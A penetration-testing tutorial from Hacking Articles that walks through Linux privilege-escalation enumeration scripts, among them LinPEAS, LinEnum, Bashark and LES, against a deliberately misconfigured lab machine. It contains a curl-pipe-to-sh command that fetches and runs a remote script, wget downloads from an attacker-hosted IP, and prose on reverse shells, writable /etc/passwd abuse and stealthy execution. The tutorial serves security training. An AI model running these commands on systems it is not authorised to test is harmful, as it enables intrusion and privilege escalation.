<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Linux Privilege Escalation: Automated Script</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/linux-privilege-escalation-automated-script/" rel="bookmark"><time class="entry-date published" datetime="2021-03-06T10:15:13+00:00">March 6, 2021</time><time class="updated" datetime="2025-06-17T18:31:12+00:00">June 17, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In this article, we will shed light on some of the Linux Privilege Escalation automated scripts that can be used to perform Post Exploitation and Enumeration after getting initial accesses on Linux based Devices.</span></p>
<h3 class="ai-optimize-7"><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li class="ai-optimize-8"><strong><span style="color: #000000;">Introduction</span></strong></li>
<li class="ai-optimize-9"><strong><span style="color: #000000;">Privilege Escalation Vectors</span></strong></li>
<li class="ai-optimize-10"><strong><span style="color: #000000;">Getting Access to Linux Machine</span></strong></li>
<li class="ai-optimize-11"><strong><span style="color: #000000;">LinPEAS</span></strong></li>
<li class="ai-optimize-12"><strong><span style="color: #000000;">LinEnum</span></strong></li>
<li class="ai-optimize-13"><strong><span style="color: #000000;">Bashark</span></strong></li>
<li class="ai-optimize-14"><strong><span style="color: #000000;">LES: Linux Exploit Suggester </span></strong></li>
<li class="ai-optimize-15"><strong><span style="color: #000000;">LinuxPrivChecker</span></strong></li>
<li class="ai-optimize-16"><strong><span style="color: #000000;">Metasploit: Local_Exploit_Suggester</span></strong></li>
<li class="ai-optimize-17"><strong><span style="color: #000000;">Linux Private-i</span></strong></li>
<li class="ai-optimize-18"><strong><span style="color: #000000;">Linux Smart Enumeration</span></strong></li>
<li class="ai-optimize-19"><strong><span style="color: #000000;">Linux Exploit Suggester 2</span></strong></li>
<li class="ai-optimize-20"><strong><span style="color: #000000;">Conclusion</span></strong></li>
</ul>
<h3 class="ai-optimize-21"><span style="color: #800000;">Introduction</span></h3>
<p class="ai-optimize-22"><span style="color: #000000;">When an attacker attacks a Linux Operating System most of the time they will get a base shell which can be converted into a TTY shell or meterpreter session. This shell is limited in the actions it can perform. So, in order to elevate privileges, we need to enumerate different files, directories, permissions, logs and /etc/passwd files. The number of files inside any Linux System is very overwhelming. Hence, doing this task manually is very difficult even when you know where to look. So, why not automate this task using scripts.</span></p>
<p class="ai-optimize-23"><span style="color: #000000;">Basically, privilege escalation is a phase that comes after the attacker has compromised the victim’s machine where he tries to gather critical information related to systems such as hidden password and weak configured services or applications and etc. All this information helps the attacker to make the post exploit against the machine for getting the higher-privileged shell.</span></p>
<h3 class="ai-optimize-24"><span style="color: #800000;">Privilege Escalation Vectors</span></h3>
<p class="ai-optimize-25"><span style="color: #000000;">Following information are considered as critical Information of Windows System:</span></p>
<ul>
<li class="ai-optimize-26"><span style="color: #000000;">The version of the operating system</span></li>
<li class="ai-optimize-27"><span style="color: #000000;">Any Vulnerable package installed or running</span></li>
<li class="ai-optimize-28"><span style="color: #000000;">Files and Folders with Full Control or Modify Access</span></li>
<li class="ai-optimize-29"><span style="color: #000000;">Mapped Drives</span></li>
<li class="ai-optimize-30"><span style="color: #000000;">Potentially Interesting Files</span></li>
<li class="ai-optimize-31"><span style="color: #000000;">Network Information (interfaces, arp)</span></li>
<li class="ai-optimize-32"><span style="color: #000000;">Firewall Status and Rules</span></li>
<li class="ai-optimize-33"><span style="color: #000000;">Running Processes</span></li>
<li class="ai-optimize-34"><span style="color: #000000;">Stored Credentials</span></li>
<li class="ai-optimize-35"><span style="color: #000000;">Sudo Rights</span></li>
<li class="ai-optimize-36"><span style="color: #000000;">Path Variables</span></li>
<li class="ai-optimize-37"><span style="color: #000000;">Docker</span></li>
<li class="ai-optimize-38"><span style="color: #000000;">Buffer Overflow conditions</span></li>
<li class="ai-optimize-39"><span style="color: #000000;">Cronjobs</span></li>
<li class="ai-optimize-40"><span style="color: #000000;">Capabilities</span></li>
</ul>
<p class="ai-optimize-41"><span style="color: #000000;">Several scripts are used in penetration testing to quickly identify potential privilege escalation vectors on Linux systems, and today we will elaborate on each script that works smoothly.</span></p>
<h3 class="ai-optimize-42"><span style="color: #800000;">Getting Access to Linux Machine</span></h3>
<p class="ai-optimize-43"><span style="color: #000000;">This step is for maintaining continuity and for beginners. If you are more of an intermediate or expert then you can skip this and get onto the scripts directly. Or if you have got the session through any other exploit then also you can skip this section.</span></p>
<p class="ai-optimize-44"><span style="color: #000000;">Since we are talking about the post-exploitation or the scripts that can be used to enumerate the conditions or opening to elevate privileges, we first need to exploit the machine. It is a rather pretty simple approach. Firstly, we craft a payload using MSFvenom. Apart from the exploit, we will be providing our local IP Address and a local port on which we are expecting to receive the session. After successfully crafting the payload, we run a python one line to host the payload on our port 80. We will use this to download the payload on the target system. After downloading the payload on the system, we start a netcat listener on the local port that we mentioned while crafting the payload. Then execute the payload on the target machine. You will get a session on the target machine.</span></p>
<p class="ai-optimize-45"><span style="color: #000000;">Refer to our <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/generating-reverse-shell-using-msfvenom-one-liner-payload/">MSFvenom Article</a></strong></span> to Learn More.</span></p>
<h3 class="ai-optimize-46"><span style="color: #800000;">LinPEAS</span></h3>
<p class="ai-optimize-47"><span style="color: #000000;"><strong>GitHub Link: <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS</a></span></strong></span></p>
<p class="ai-optimize-48"><span style="color: #000000;">Let’s start with LinPEAS. It was created by <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/carlospolopm">Carlos P</a></strong></span>. The developers made it with a simple objective to enumerate all the possible ways or methods to Elevate Privileges on a Linux System. One of the best things about LinPEAS is that it doesn’t have any dependency. This enables it to run anything that is supported by the pre-existing binaries. The team tested LinPEAS on Debian, CentOS, FreeBSD, and OpenBSD. The developers designed LinPEAS in such a way that it won’t write anything directly to the disk and while running on default, it won’t try to login as another user through the su command. </span></p>
<p class="ai-optimize-48"><span style="color: #000000;">The amount of time LinPEAS takes varies from 2 to 10 minutes depending on the number of checks that are requested. If you are running WinPEAS inside a Capture the Flag Challenge then doesn’t shy away from using the -a parameter. It will activate all checks. LinPEAS monitors the processes in order to find very frequent cron jobs but in order to do this you will need to add the -a parameter and this check will write some info inside a file that will be deleted later. This makes it perfect as it is not leaving a trace.</span></p>
<h4 class="ai-optimize-49"><span style="color: #000000;">Let’s talk about other parameters.</span></h4>
<p class="ai-optimize-50"><span style="color: #000000;"><strong>-s (superfast &amp; stealth):</strong> This will bypass some time-consuming checks and will leave absolutely no trace.</span></p>
<p class="ai-optimize-51"><span style="color: #000000;"><strong>-P (Password):</strong> Pass a password that will be used with sudo -l and Bruteforcing other users</span></p>
<p class="ai-optimize-52"><span style="color: #000000;"><strong>-h</strong> Help Banner</span></p>
<p class="ai-optimize-53"><span style="color: #000000;"><strong>-o</strong> Only execute selected checks</span></p>
<p class="ai-optimize-54"><span style="color: #000000;"><strong>-d &lt;IP/NETMASK&gt;</strong> Discover hosts using fping or ping</span></p>
<p class="ai-optimize-55"><span style="color: #000000;"><strong>ip &lt;PORT(s)&gt; -d &lt;IP/NETMASK&gt;</strong> Discover hosts looking for TCP open ports using nc</span></p>
<p class="ai-optimize-56"><span style="color: #000000;">It exports and unset some environmental variables during the execution so no command executed during the session will be saved in the history file and if you don’t want to use this functionality just add a -n parameter while exploiting it. LinPEAS can be executed directly from GitHub by using the curl command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh</pre>
<p class="ai-optimize-57"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TQdr0S-dXlI/YENQ9Y6WwVI/AAAAAAAAudA/hZ8aDTmT9EAagV1YXk5cdQzpv_-bRrBowCLcBGAsYHQ/s16000/1.png"/></span></p>
<p class="ai-optimize-58"><span style="color: #000000;">Here, we can see the Generic Interesting Files Module of LinPEAS at work. Among other things, it also enumerates and lists the writable files for the current user and group. Here we can see that the Docker group has writable access. So, if we write a file by copying it to a temporary container and then back to the target destination on the host. We might be able to elevate privileges. It is possible because some privileged users are writing files outside a restricted file system.</span></p>
<p class="ai-optimize-59"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-drQG5WZRyGM/YENRCSKqv_I/AAAAAAAAudE/JuL0GAcRx5kpA6GPXqe0QCT_CkjJzzFGwCLcBGAsYHQ/s16000/2.png"/></span></p>
<p class="ai-optimize-60"><span style="color: #000000;">Moving on we found that there is a python file by the name of cleanup.py inside the mnt directory. It must have execution permissions as cleanup.py is usually linked with a cron job. So, we can enter a shell invocation command</span></p>
<p class="ai-optimize-61"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vS9wvdRaYjQ/YENRGZgn_QI/AAAAAAAAudI/fqKPbecTB6AWy7VkBtLtaKwr2J5Tj7UhwCLcBGAsYHQ/s16000/3.png"/></span></p>
<h5 class="ai-optimize-62"><span style="color: #000000;"><strong>SUID Checks:</strong> </span></h5>
<p class="ai-optimize-62"><span style="color: #000000;">Set User ID is a type of permission that allows users to execute a file with the permissions of a specified user. Those files which have SUID permissions run with higher privileges. Here, LinPEAS have shown us that the target machine has SUID permissions on find, cp and nano.</span></p>
<p class="ai-optimize-63"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CLpG9W_GAM0/YENRNSGNjLI/AAAAAAAAudQ/5l3RwijV8pAlxFWmpnbUa_A3F6vcDn6CQCLcBGAsYHQ/s16000/4.png"/></span></p>
<p class="ai-optimize-64"><span style="color: #000000;">LinPEAS also checks for various important files for write permissions as well. Here, we can see that the target server has /etc/passwd file writable. This means that the attacker can create a user and password hash on their device and then append that user into the /etc/passwd file with root access and that have compromised the device to the root level.</span></p>
<p class="ai-optimize-65"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KPT2hVlXtR0/YENRR7xDATI/AAAAAAAAudU/1ZGNcIVTOhEcCojm-R9MbrS2V3vcf2aiQCLcBGAsYHQ/s16000/5.png"/></span></p>
<p class="ai-optimize-66"><span style="color: #000000;">Next detection happens for the sudo permissions. This means that the current user can use the following commands with elevated access without a root password. This can enable the attacker to refer these into the GTFOBIN and find a simple one line to get root on the target machine.</span></p>
<p class="ai-optimize-67"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LMNsq-KUIcA/YENRVl9PDhI/AAAAAAAAudY/PjSREhR3eu06waAO9T9S4-QEpawfdKjEQCLcBGAsYHQ/s16000/6.png"/></span></p>
<p class="ai-optimize-68"><span style="color: #000000;">In the beginning, we run LinPEAS by taking the SSH of the target machine. In the beginning, we run LinPEAS by taking the SSH of the target machine and then using the curl command to download and run the LinPEAS script. But there might be situations where it is not possible to follow those steps. Hence, we will transfer the script using the combination of python one-liner on our attacker machine and wget on our target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls
python -m SimpleHTTPServer 80</pre>
<p class="ai-optimize-69"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-332ZEXre__g/YENRZ8VO-RI/AAAAAAAAudc/GypaV97vMUsFAlsk8vZ7lfB7IWTCIpJ8QCLcBGAsYHQ/s16000/7.png"/></span></p>
<p class="ai-optimize-70"><span style="color: #000000;">We downloaded the script inside the tmp directory as it has written permissions. Also, we must provide the proper permissions to the script in order to execute it.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
wget 192.168.1.5/linpeas.sh
chmod 777 linpeas.sh
./linpeas.sh</pre>
<p class="ai-optimize-71"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-w9LqQ0BYIio/YENRf4f9mKI/AAAAAAAAudk/CkvtICINyvI5ueSxJRjtHT9BepI8tO6UQCLcBGAsYHQ/s16000/8.png"/></span></p>
<h3 class="ai-optimize-72"><span style="color: #800000;">LinEnum</span></h3>
<p class="ai-optimize-73"><span style="color: #000000;"><strong>GitHub Link: <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">LinEnum</a></span></strong></span></p>
<p class="ai-optimize-74"><span style="color: #000000;">Time to take a look at LinEnum. It was created by <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/rebootuser">Rebootuser</a></strong></span>.  LinEnum is a shell script that works in order to extract information from the target machine about elevating privileges. It supports an Experimental Reporting functionality that can help to export the result of the scan in a readable report format. It has a few options or parameters such as:</span></p>
<p class="ai-optimize-75"><span style="color: #000000;"><strong>-k Enter keyword</strong></span></p>
<p class="ai-optimize-76"><span style="color: #000000;"><strong>-e Enter export location</strong></span></p>
<p class="ai-optimize-77"><span style="color: #000000;"><strong>-t Include thorough (lengthy) tests</strong></span></p>
<p class="ai-optimize-78"><span style="color: #000000;"><strong>-s Supply current user password to check sudo perms (INSECURE)</strong></span></p>
<p class="ai-optimize-79"><span style="color: #000000;"><strong>-r Enter report name</strong></span></p>
<p class="ai-optimize-80"><span style="color: #000000;"><strong>-h Displays help text</strong></span></p>
<p class="ai-optimize-81"><span style="color: #000000;">It checks various resources or details mentioned below:</span></p>
<h4 class="ai-optimize-82"><span style="color: #000000;">Kernel and distribution release details</span></h4>
<h5 class="ai-optimize-83"><span style="color: #000000;"><strong>System Information:</strong></span></h5>
<p class="ai-optimize-84"><span style="color: #000000;">Hostname, Networking details, Current IP, Default route details, DNS server information</span></p>
<h5 class="ai-optimize-85"><span style="color: #000000;"><strong>User Information:</strong></span></h5>
<p class="ai-optimize-86"><span style="color: #000000;">Current user details, Last logged on users, shows users logged onto the host, list all users including uid/gid information, List root accounts, Extract’s password policies and hash storage method information, checks umask value, checks if password hashes are stored in /etc/passwd, extract full details for ‘default’ uid’s such as 0, 1000, 1001 etc., attempt to read restricted files i.e., /etc/shadow, List current users history files (i.e. .bash_history, .nano_history etc.), Basic SSH checks</span></p>
<h5 class="ai-optimize-87"><span style="color: #000000;"><strong>Privileged access:</strong></span></h5>
<p class="ai-optimize-88"><span style="color: #000000;">Which users have recently used sudo, determine if /etc/sudoers is accessible, determine if the current user has Sudo access without a password, are known ‘good’ breakout binaries available via Sudo (i.e., nmap, vim etc.), Is root’s home directory accessible, List permissions for /home/</span></p>
<h5 class="ai-optimize-89"><span style="color: #000000;"><strong>Environmental:</strong></span></h5>
<p class="ai-optimize-90"><span style="color: #000000;">Display current $PATH, Displays env information</span></p>
<h5 class="ai-optimize-91"><span style="color: #000000;"><strong>Jobs/Tasks:</strong></span></h5>
<p class="ai-optimize-92"><span style="color: #000000;">List all cron jobs, locate all world-writable cron jobs, locate cron jobs owned by other users of the system, List the active and inactive systemd timers</span></p>
<h5 class="ai-optimize-93"><span style="color: #000000;"><strong>Services:</strong></span></h5>
<p class="ai-optimize-94"><span style="color: #000000;">List network connections (TCP &amp; UDP), List running processes, Lookup and list process binaries and associated permissions, List Netconf/indecent contents and associated binary file permissions, List init.d binary permissions</span></p>
<h5 class="ai-optimize-95"><span style="color: #000000;"><strong>Version Information (of the following):</strong></span></h5>
<p class="ai-optimize-96"><span style="color: #000000;">Sudo, MYSQL, Postgres, Apache (Checks user config, shows enabled modules, Checks for htpasswd files, View www directories)</span></p>
<h5 class="ai-optimize-97"><span style="color: #000000;"><strong>Default/Weak Credentials:</strong></span></h5>
<p class="ai-optimize-98"><span style="color: #000000;">Checks for default/weak Postgres accounts, Checks for default/weak MYSQL accounts</span></p>
<h5 class="ai-optimize-99"><span style="color: #000000;"><strong>Searches:</strong></span></h5>
<p class="ai-optimize-100"><span style="color: #000000;">Locate all SUID/GUID files, Locate all world-writable SUID/GUID files, Locate all SUID/GUID files owned by root, Locate ‘interesting’ SUID/GUID files (i.e. nmap, vim etc.), Locate files with POSIX capabilities, List all world-writable files, Find/list all accessible *.plan files and display contents, Find/list all accessible *.rhosts files and display contents, Show NFS server details, Locate *.conf and *.log files containing keyword supplied at script runtime, List all *.conf files located in /etc, .bak file search, Locate mail</span></p>
<h5 class="ai-optimize-101"><span style="color: #000000;"><strong>Platform/software specific tests:</strong></span></h5>
<p class="ai-optimize-102"><span style="color: #000000;">Checks to determine if we’re in a Docker container checks to see if the host has Docker installed, checks to determine if we’re in an LXC container</span></p>
<p class="ai-optimize-103"><span style="color: #000000;">Here, we are downloading the locally hosted LinEnum script and then executing it after providing appropriate permissions.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget 192.168.1.5/LinEnum.sh
chmod 777 LinEnum.sh
./LinEnum.sh</pre>
<p class="ai-optimize-104"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AQ1vmj8-8Og/YENRl5A7HYI/AAAAAAAAudw/QyXBZ2QqDhEBk0yP_WClt3_w2AkJYG03gCLcBGAsYHQ/s16000/9.png"/></span></p>
<p class="ai-optimize-105"><span style="color: #000000;">We can see that it has enumerated for SUID bits on nano, cp and find.</span></p>
<p class="ai-optimize-106"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-x_OjQYeYSTI/YENRrF-kWJI/AAAAAAAAud0/m23IMrHqBm4gE40cpXdjGHeJoiFaOoC2wCLcBGAsYHQ/s16000/10.png"/></span></p>
<p class="ai-optimize-107"><span style="color: #000000;">When enumerating the Cron Jobs, it found the cleanup.py that we discussed earlier.</span></p>
<p class="ai-optimize-108"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-66Yo1I6WU98/YENRwtRZkQI/AAAAAAAAud8/HALrTZbjCs4SC3krXLd0ww036h5o5j0mACLcBGAsYHQ/s16000/11.png"/></span></p>
<p class="ai-optimize-109"><span style="color: #000000;">It also checks for the groups with elevated accesses. In this case it is the docker group.</span></p>
<p class="ai-optimize-110"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PLdMg6bAqmc/YENR2N3LryI/AAAAAAAAueE/X86T3mYddRsGTYRDkmKfMHTZip1J8z9wwCLcBGAsYHQ/s16000/12.png"/></span></p>
<p class="ai-optimize-111"><span style="color: #000000;">LinEnum also found that the /etc/passwd file is writable on the target machine.</span></p>
<h3 class="ai-optimize-112"><span style="color: #800000;">Bashark</span></h3>
<p class="ai-optimize-113"><span style="color: #000000;"><strong>GitHub Link: <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://raw.githubusercontent.com/redcode-labs/Bashark/master/bashark.sh">Bashark</a></span></strong></span></p>
<p class="ai-optimize-114"><span style="color: #000000;">Time to surf with the Bashark. It was created by <span style="color: #0000ff;"><strong>RedCode Labs</strong></span>. Bashark has been designed to assist penetrations testers and security researchers for the post-exploitation phase of their security assessment of a Linux, OSX or Solaris Based Server.</span></p>
<p class="ai-optimize-115"><span style="color: #000000;">Some of the prominent features of Bashark are that it is a bash script that means that it can be directly run from the terminal without any installation. It is fast and doesn’t overload the target machine. It does not have any specific dependencies that you would require to install in the wild. As it wipes its presence after execution it is difficult to be detected after execution. Here, we downloaded the Bashark using the wget command which is locally hosted on the attacker machine. Then provided execution permissions using chmod and then run the Bashark script. It upgrades your shell to be able to execute different commands.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
wget 192.168.1.5/bashark.sh
chmod 777 bashark.sh
source bashark.sh</pre>
<p class="ai-optimize-116"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-a4CiMT_x_10/YENR-zecoZI/AAAAAAAAueQ/B81CD_-5RdksMeRVogOuB5TKzicpUA8TwCLcBGAsYHQ/s16000/14.png"/></span></p>
<p class="ai-optimize-117"><span style="color: #000000;">Here we used the getperm -c command to read the SUID bits on nano, cp and find among other binaries. Bashark also enumerated all the common config files path using the getconf command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">getperm -c
getconf</pre>
<p class="ai-optimize-118"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nycNp7HZ1rg/YENSD_iOGRI/AAAAAAAAueY/r05pqBVSqSYcFsokTt5SQYCP66KXMFMQQCLcBGAsYHQ/s16000/15.png"/></span></p>
<h3 class="ai-optimize-119"><span style="color: #000000;"><strong><span style="color: #800000;">LES: Linux Exploit Suggester</span> </strong></span></h3>
<p class="ai-optimize-120"><span style="color: #000000;"><strong>GitHub Link: <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh">LES</a></span></strong></span></p>
<p class="ai-optimize-121"><span style="color: #000000;">Time to get suggesting with the LES. It was created by <a style="color: #000000;" href="https://z-labs.eu/"><span style="color: #0000ff;"><strong>Z-Lab</strong></span>s</a>.  As with other scripts in this article, the developers also designed this tool to help the security testers or analysts test the Linux Machine for potential vulnerabilities and ways to elevate privileges. The creators crafted LES in such a way that it can work across different versions or flavours of Linux. Extensive research and improvements have made the tool robust and with minimal false positives. </span></p>
<p class="ai-optimize-121"><span style="color: #000000;">The basic working of the LES starts with generating the initial exploit list based on the detected kernel version and then it checks for the specific tags for each exploit. It collects all the positive results and then ranks them according to the potential risk and then show it to the user. We can see that the target machine is vulnerable to CVE 2021-3156, CVE 2018-18955, CVE 2019-18634, CVE, 2019-15666, CVE 2017-0358 and others. Now we can read about these vulnerabilities and use them to elevate privilege on the target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod 777 les.sh
./les.sh</pre>
<p class="ai-optimize-122"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8RD5dI4JQnQ/YENSa5E8stI/AAAAAAAAue4/DAO9B_14XoABTw1S3vV3dovrjz9uYwrKQCLcBGAsYHQ/s16000/16.png"/></span></p>
<h3 class="ai-optimize-123"><span style="color: #800000;">LinuxPrivChecker</span></h3>
<p class="ai-optimize-124"><span style="color: #000000;"><strong>GitHub Link: <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py">LinuxPrivChecker</a></span></strong></span></p>
<p class="ai-optimize-125"><span style="color: #000000;">Checking some Privs with the LinuxPrivChecker. It was created by <a style="color: #000000;" href="https://twitter.com/MikeCzumak"><span style="color: #0000ff;"><strong>Mike Czumak</strong></span></a> and maintained by <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/sleventyeleven">Michael Contino</a>.</strong></span> Let’s concentrate on a Python script after the collection of shell scripts. The Linux system is the target of this Python script. It looks for relevant exploits, clear-text passwords, readable files, and configuration errors. Additionally, it highlights some intriguing places that can elevate privileges and play a significant part. The basic system information is presented first. The kernel version, hostname, operating system, network information, running services, etc. are then displayed.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python linuxprivchecker.py</pre>
<p class="ai-optimize-126"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KtiawmrQLFA/YENShgOjDkI/AAAAAAAAue8/oMtyMinVpQ8sumEhCr0dsG6e6En0K0SjQCLcBGAsYHQ/s16000/17.png"/></span></p>
<p class="ai-optimize-127"><span style="color: #000000;">LinuxPrivChecker also works to check the /etc/passwd/ file and other information such as group information or write permissions on different files of potential interest.</span></p>
<p class="ai-optimize-128"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZfuikK2kYjg/YENSm6rWh4I/AAAAAAAAufE/kirKkXgKd6kNv7nYNGqv9HAKjCUYSVO2wCLcBGAsYHQ/s16000/18.png"/></span></p>
<h3 class="ai-optimize-129"><span style="color: #800000;"><strong>Metasploit: Local_Exploit_Suggester</strong></span></h3>
<p class="ai-optimize-130"><span style="color: #000000;">In some cases, people who don’t like to get into scripts or those who use Metasploit to exploit the target system end up with a meterpreter session. So, in these instances, we can use a post-exploitation module to check for ways to elevate privilege as other scripts. All it requires is the session identifier number to run on the exploited target. It will list various vulnerabilities that the system is vulnerable to.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/multi/recon/local_exploit_suggester
set session 2
exploit</pre>
<p class="ai-optimize-131"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zzlIu-31_18/YENSr2vAitI/AAAAAAAAufM/fidci94p5fQD6Q8Y1JbAy1xJwYlfjLuvgCLcBGAsYHQ/s16000/19.png"/></span></p>
<h3 class="ai-optimize-132"><span style="color: #800000;"><strong>Linux Private-i</strong></span></h3>
<p class="ai-optimize-133"><span style="color: #000000;"><strong>GitHub Link: <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://raw.githubusercontent.com/rtcrowley/linux-private-i/master/private-i.sh">Linux Private-i</a></span></strong></span></p>
<p class="ai-optimize-134"><span style="color: #000000;">Checking some Privs with the LinuxPrivChecker. It was created by <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/rtcrowley">creosote</a></strong></span>. Linux Private-i can be defined as a Linux Enumeration or Privilege Escalation tool that performs the basic enumeration steps and displays the results in an easily readable format. The script has a very verbose option that includes vital checks such as OS info and permissions on common files, search for common applications while checking versions, file permissions and possible user credentials, common apps: Apache/HTTPD, Tomcat, Netcat, Perl, Ruby, Python, WordPress, Samba, Database Apps: SQLite, Postgres, MySQL/MariaDB, MongoDB, Oracle, Redis, CouchDB, Mail Apps: Postfix, Dovecot, Exim, Squirrel Mail, Cyrus, Sendmail, Courier, Checks Networking info – netstat, ifconfig, Basic mount info, crontab and bash history. </span></p>
<p class="ai-optimize-134"><span style="color: #000000;">Here’s a snippet when running the Full Scope. This box has purposely misconfigured files and permissions. We see that the target machine has the /etc/passwd file writable. We are also informed that the Netcat, Perl, Python, etc. are installed on the target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod 777 private-i.sh
./private-i.sh</pre>
<p class="ai-optimize-135"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-izUOuzf_IhU/YENSw0x-3cI/AAAAAAAAufQ/ZClqThOQXsMWgW-5R98DgmN8Zn_8DUxwgCLcBGAsYHQ/s16000/20.png"/></span></p>
<p class="ai-optimize-136"><span style="color: #000000;">Private-i also extracted the script inside the cronjob that gets executed after the set duration of time.</span></p>
<p class="ai-optimize-137"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FSIvbhSuHQg/YENTMIFY3LI/AAAAAAAAufk/wSzUbydh1mA6LY9TiGvA6AWfuXMOQ0AoQCLcBGAsYHQ/s16000/21.png"/></span></p>
<h3 class="ai-optimize-138"><span style="color: #800000;"><strong>Linux Smart Enumeration</strong></span></h3>
<p class="ai-optimize-139"><span style="color: #000000;"><strong>GitHub Link: <a style="color: #000000;" href="https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh">L<span style="color: #0000ff;">inux Smart Enumeration</span></a></strong></span></p>
<p class="ai-optimize-140"><span style="color: #000000;">Avoid using the stupid time-tracking methods when using Linux Smart Enumeration. <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/diego-treitos">Diego Blanco</a></strong></span> was the one who created it. The LinEnum Script that we previously covered served as the model for the Linux Smart Enumeration script. Like all the other scripts stated, this one has the same goal. This script provides three levels of verbosity so that the user can adjust how much information they display. It uses color to distinguish between different warning types; for example, green signals that privileges on the target machine may be elevated. In order to verify the sudo privilege, it asks the user if they know the password. It examines the Path Variables, Sudo Permissions, user groups, and other pertinent files.  </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod 777 lse.sh
./lse.sh</pre>
<p class="ai-optimize-141"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BKI97EutJcU/YENTQ8vcU3I/AAAAAAAAufo/Hr1Llfr0LOwkg_85hylfEhJHWQ3XvggxgCLcBGAsYHQ/s16000/22.png"/></span></p>
<p class="ai-optimize-142"><span style="color: #000000;">We can also see the cleanup.py file that gets re-executed again and again by the crontab.</span></p>
